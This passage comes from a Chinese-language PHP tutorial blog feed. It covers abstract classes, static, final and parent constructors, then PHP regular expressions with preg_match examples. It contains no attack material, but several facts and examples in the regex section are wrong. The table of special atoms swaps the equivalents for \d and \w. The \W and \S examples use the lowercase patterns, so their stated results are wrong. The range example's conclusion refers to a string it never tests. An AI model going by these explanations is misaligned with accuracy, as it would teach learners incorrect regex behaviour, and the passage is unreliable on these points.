class="string">&quot;&lt;br/&gt;&quot;</span>; // 自 5.3.0 起</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$class</span> = new MyClass();</span><br><span class="line"> <span class="variable">$class</span>-&gt;showConstant();</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$class</span>::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>; // 自 PHP 5.3.0 起</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>8. 抽象类</strong></font><br>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。<br>定义为抽象的类不能被实例化。<br>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。<br>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么<br>子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。此外方法的调用方式必须匹配，即类型和所需参数数量必须一致。例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则两者的声明并无冲突。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass1</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ConcreteClass1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span>(<span class="params">$prefix</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$prefix&#125;</span>ConcreteClass1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass2</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ConcreteClass2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span>(<span class="params">$prefix</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$prefix&#125;</span>ConcreteClass2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> ConcreteClass1;</span><br><span class="line">$class1-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> $class1-&gt;prefixValue(<span class="string">&#x27;FOO_&#x27;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$class2 = <span class="keyword">new</span> ConcreteClass2;</span><br><span class="line">$class2-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> $class2-&gt;prefixValue(<span class="string">&#x27;FOO_&#x27;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">ConcreteClass1</span><br><span class="line">FOO_ConcreteClass1</span><br><span class="line">ConcreteClass2</span><br><span class="line">FOO_ConcreteClass2</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>9. Static 关键字</strong></font><br>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。<br>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。<br>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。<br>静态属性不可以由对象通过 -&gt; 操作符来访问。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> $my_static = <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$my_static;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> Foo::$my_static . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="keyword">print</span> $foo-&gt;staticValue() . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">foo</span><br><span class="line">foo</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>10. Final 关键字</strong></font><br>PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。<br></font></p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;BaseClass::test() called&quot;</span> . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;BaseClass::moreTesting() called&quot;</span>  . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;ChildClass::moreTesting() called&quot;</span>  . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">Fatal <span class="built_in">error</span>:  Cannot override <span class="keyword">final</span> method BaseClass::moreTesting() in D:\WWW\Basis\oop\opp_9.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>11.调用父类构造方法</strong></font><br>PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct()<br></font> </p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;BaseClass 类中构造方法&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">parent</span>::__construct();  <span class="comment">// 子类构造方法不能自动调用父类的构造方法</span></span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;SubClass 类中构造方法&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">OtherSubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 继承 BaseClass 的构造方法</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line"> $obj = <span class="keyword">new</span> BaseClass();</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass、SubClass 构造方法</span></span><br><span class="line"> $obj = <span class="keyword">new</span> SubClass();</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line"> $obj = <span class="keyword">new</span> OtherSubClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">SubClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-9-PHP-函数"><a href="#1-9-PHP-函数" class="headerlink" title="1.9 PHP 函数"></a><font color="#3CB371" face="Comic sans MS">1.9 PHP 函数</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-function">参见本站博客：PHP-函数</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="二、-PHP-正则表达式"><a href="#二、-PHP-正则表达式" class="headerlink" title="二、 PHP 正则表达式"></a><font color="#FF6347" face="Comic sans MS">二、 PHP 正则表达式</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Regular-Expression">参见本站博客：PHP-正则表达式</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="三、-PHP-文件系统"><a href="#三、-PHP-文件系统" class="headerlink" title="三、 PHP 文件系统"></a><font color="#FF6347" face="Comic sans MS">三、 PHP 文件系统</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-FileSystem">参见本站博客：PHP-文件系统</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="四、-PHP-文件上传"><a href="#四、-PHP-文件上传" class="headerlink" title="四、 PHP 文件上传"></a><font color="#FF6347" face="Comic sans MS">四、 PHP 文件上传</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Upload">参见本站博客：PHP-文件上传</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="五、-MySQL入门"><a href="#五、-MySQL入门" class="headerlink" title="五、 MySQL入门"></a><font color="#FF6347" face="Comic sans MS">五、 MySQL入门</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/MySQL-Primer">参见本站博客：MySQL入门</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="六、-PHP操作MySQL数据库"><a href="#六、-PHP操作MySQL数据库" class="headerlink" title="六、 PHP操作MySQL数据库"></a><font color="#FF6347" face="Comic sans MS">六、 PHP操作MySQL数据库</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-MySQL">参见本站博客：PHP操作MySQL数据库</a>]</strong></font><br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="七、-PHP会话管理和控制"><a href="#七、-PHP会话管理和控制" class="headerlink" title="七、 PHP会话管理和控制"></a><font color="#FF6347" face="Comic sans MS">七、 PHP会话管理和控制</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-SessionManagement">参见本站博客：PHP-会话管理和控制</a>]</strong></font><br></font></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-正则表达式</title>
    <url>/post/PHP-Regular-Expression/</url>
    <content><![CDATA[<p>世界上最难懂的是道士的鬼符、医生的处方和程序员的正则表达示。(ง •_•)ง</p>
<a id="more"></a>

<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 正则表达式</font></center>

<p>&emsp;<br>&emsp;</p>
<p><font color="red"><strong>正则表达示我们其实之前经常看到，它主要用在以下一些地方：</strong></font><br>1.匹配邮箱、手机号码、验证码<br>2.替换敏感的关键词。例如：涉及政治和骂人的话<br>3.文章采集。<br>4.早期的表情替换技术,ubb文件编码、markdown编辑器替换等<br>5.以后自己写模板引擎也需要用到正则表达示<br>其他….<br><font face="Comic sans MS"></font></p>
<blockquote>
<p>正则表达式是一种描述字符串结果的语法规则，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串。<font color="#00B2EE"><strong>常用的语言基本上都有正则表达式，如JavaScript、java</strong></font>等。其实，只有了解一种语言的正则使用，其他语言的正则使用起来，就相对简单些。文本主要围绕解决下面问题展开。</p>
</blockquote>
<hr>
<hr>
<h3 id="1-定界符"><a href="#1-定界符" class="headerlink" title="1. 定界符"></a><font color="#FF6347" face="Comic sans MS">1. 定界符</font></h3><p><font face="Comic sans MS">定界符，就是定一个边界，边界以内的就是正则表达示。<br>PHP的正则表达示定界符的规定如下：<br>定界符，<font color="#00B2EE"><strong>不能用a-zA-Z0-9\ 其他的都可以用。必须成对出现，有开始就有结束。</strong></font><br>我们来例几个例子：<br></font></p>
<table>
<thead>
<tr>
<th align="center">例子</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">/中间写正则/</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">$中间写正则$</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">%中间写正则%</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">^中间写正则^</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">@中间写正则@</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">#中间写正则#</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">(中间写正则)</td>
<td align="center">错误</td>
</tr>
<tr>
<td align="center">A中间写正则A</td>
<td align="center">错误</td>
</tr>
</tbody></table>
<p>&emsp;<br>&emsp;</p>
<h3 id="2-转义字符"><a href="#2-转义字符" class="headerlink" title=" 2. 转义字符 "></a><font face="Comic sans MS" color="#FF6347"> 2. 转义字符 </font></h3><p><font face="Comic sans MS">注：<font color="#FF7F00">\ </font>是转义字符，如果在以后正则表达示里面需要匹配/，如下：<br>/ / /<br>这个时候真要匹配/ 的时候，需要把定界符里面的/ 用转义字符转义一下，写成下面的例子：<br>/ <font color="#FF7F00">&lt;/font&gt;/ /<br>如果你觉得麻烦，遇到这种需要转义的字符的时候可以把两个正斜线（/ /）定界，改为其他的定界符（# #）。<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="3-原子"><a href="#3-原子" class="headerlink" title=" 3. 原子 "></a><font face="Comic sans MS"><font color="#FF6347"> 3. 原子 </font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>原子</strong></font>是正则表达示里面的最小单位，原子说白了就是需要匹配的内容。一个成立的正则表达示当中必须最少要有一个原子。<br><font color="#00B2EE"><strong>所有可见不可见的字符就是原子！</strong></font><br><font color="red"><strong>说明：</strong></font>我们见到的空格、回车、换行、0-9、A-Za-z、中文、标点符号、特殊符号全为原子。<br>在做原子的实例前我们先来讲解一个函数,preg_match:<br><font color="red">int preg_match ( string $正则 , string $字符串 [, array &amp;$结果] )</font><br>功能：根据$正则变量，匹配$字符串变量。如果存在则返回匹配的个数，把匹配到的结果放到$结果变量里。如果没有匹配到结果返回0。<br><strong>注：</strong>上面是preg_match常用的主要几个参数。我在上面将另外几个参数没有列出来。因为，另外两个参数太不常用了。<br>我们来通过实验来证明：<br></font></p>
<p><font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//定义一个变量叫zz，放正则表达示。为了方便大家记忆，如果你英文比较ok，建议把变量名还是写成</span><br><span class="line">//英文的<span class="variable">$pattern</span>。</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/a/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ddfdjjvi2jfvkwkfi24&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为我希望的是匹配a，而$string当是是不存在a的，所以不成功。</p>
</blockquote>
<p><font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/wq/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ssssswqaaaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面的字符串中s后存在wq，因此匹配成功。</p>
</blockquote>
<p>接下来我们匹配一个空格试试：<br><font color="#FF6347">(3)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ /&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;sssssw aaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(1) <span class="string">&quot; &quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因上，$string这个变量的w字符后存在一个空格。所以匹配成功，输出了字符串类型，长度为1。只不过我们的肉眼不可见，看不到这个字符串而已。</p>
</blockquote>
<p>&emsp;</p>
<h3 id="4-特殊标识的原子"><a href="#4-特殊标识的原子" class="headerlink" title="4. 特殊标识的原子"></a><font face="Comic sans MS" color="#FF6347">4. 特殊标识的原子</font></h3><table>
<thead>
<tr>
<th align="center">原子</th>
<th align="left">说明</th>
<th align="left">等价式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\d</td>
<td align="left">匹配一个0-9</td>
<td align="left">[a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="left">除了0-9以外的所有字符</td>
<td align="left">[^a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="left">a-zA-Z0-9_</td>
<td align="left">[0-9]</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="left">除了0-9A-Za-z_以外的所有字符</td>
<td align="left">[^0-9]</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="left">匹配所有空白字符\n \t \r 空格</td>
<td align="left">[ \t\n\f\r]</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="left">匹配所有非空白字符</td>
<td align="left">[^ \t\n\f\r]</td>
</tr>
<tr>
<td align="center">[ ]</td>
<td align="left">指定范围的原子</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><font color="#FF6347">这个个需要记住，最好达到默写级别。记忆的时候成对记忆，\d是匹配一个0-9，那么\D 就是除了0-9以外的所有字符。上面已经说明的很清楚了，我们进行实验一步一步对这些进行学习。</font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. \d匹配一个0-9</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;我爱喝9你爱不爱喝&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. \D匹配一个非0-9的值</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\D/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;121243中23453453&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，匹配到了中。因为它不是0-9之间的字符。</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. \w匹配一个a-zA-Z0-9_</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;新中_国万岁呀万岁&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，匹配到了下划线。</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. \W匹配一个非a-zA-Z0-9_</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;afasABCWEQR44231284737&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配失败。因为，上面上面全是a-zA-Z0-9_，没有非a-zA-Z0-9_。</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. \s 匹配所有空白字符\n \t \r 空格</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\s/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;中国万</span></span><br><span class="line"><span class="string">岁&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，因为有一个回车。</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. \S 非空字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\s/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;        </span></span><br><span class="line"><span class="string">         a       &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功。虽然上面有空格，回车和缩进。但是，有一个非空白字符a。因此，匹配成功。</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. [] 指定范围的原子</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[0-5]\w+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;6a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;1C&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中0-5匹配$string失败，而$string1成功。因为，$string中的第一个数值为6，不在[0-5]的范围之内。</p>
</blockquote>
